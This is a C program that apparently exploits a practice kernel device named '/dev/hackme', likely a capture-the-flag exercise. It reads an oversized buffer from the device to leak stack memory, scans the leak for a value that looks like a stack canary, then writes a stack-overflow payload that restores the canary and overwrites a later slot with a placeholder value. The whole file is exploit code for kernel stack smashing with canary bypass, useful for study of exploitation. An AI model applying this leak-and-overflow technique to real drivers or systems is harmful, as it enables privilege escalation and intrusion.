#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

#define CANARY_SIZE 0x8
#define BUF_MAX 0x180
#define CANARY_OFFSET 0x80

int dev_open(const char *devname) {
    int fd = open(devname, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s.", devname);
        exit(EXIT_FAILURE);
    }
    return fd;
}

bool is_canary(uint64_t leak) {
    uint16_t prefix = leak >> 48;
    uint8_t null_byte = leak & 0xff;
    return ((prefix != 0xffff) && (null_byte == 0) && (prefix != 0));
}

void exploit(int fd, uint64_t canary) {
    int size = BUF_MAX / 8;
    int idx = CANARY_OFFSET / 8;
    uint64_t payload[size + 1];

    payload[idx] = canary;
    payload[idx + 4] = 0x4141414141414141;

    size_t bytes_sent = write(fd, payload, sizeof(payload));
}

uint64_t leak(int fd) {
    size_t   bytes_read  = 0;
    uint64_t canary      = 0;

    int size = BUF_MAX / 8;
    uint64_t leak[size + 1];
    bytes_read = read(fd, leak, BUF_MAX);
    if (bytes_read < 0) {
        fprintf(stderr, "[-] Failed to read.");
        goto LEAK_EXIT;
    }

    printf("[+] Beginning leak:\n");
    printf("\tOffset:\tLeak Data\n");
    /* For whatever reason, the canary appears three times in the leak. Once
       inside the `tmp` variable on the stack (improper initialization?), once
       0x80, again at 0xf0 for a different stack frame. The 0x80 location is
       actual canary location offset
    */
    for (int idx = 0; idx < size; idx++) {
        printf("\t0x%lx:\t0x%016lx", idx * sizeof(canary), leak[idx]);
        if (is_canary(leak[idx])) {
            printf("  CANARY CANDIDATE");
            canary = leak[idx];
        }
        printf("\n");
    }

LEAK_EXIT:
    return canary;
}

int main(int argc, char **argv) {
    int      devfd      = 0;
    int      bytes_read = 0;
    uint64_t canary     = 0;

    devfd = dev_open("/dev/hackme");
    canary = leak(devfd);
    if (canary == 0) {
        fprintf(stderr, "[-] Failed to leak canary.\n");
        goto EXIT;
    }
    exploit(devfd, canary);

EXIT:
    close(devfd);
    return 0;
}
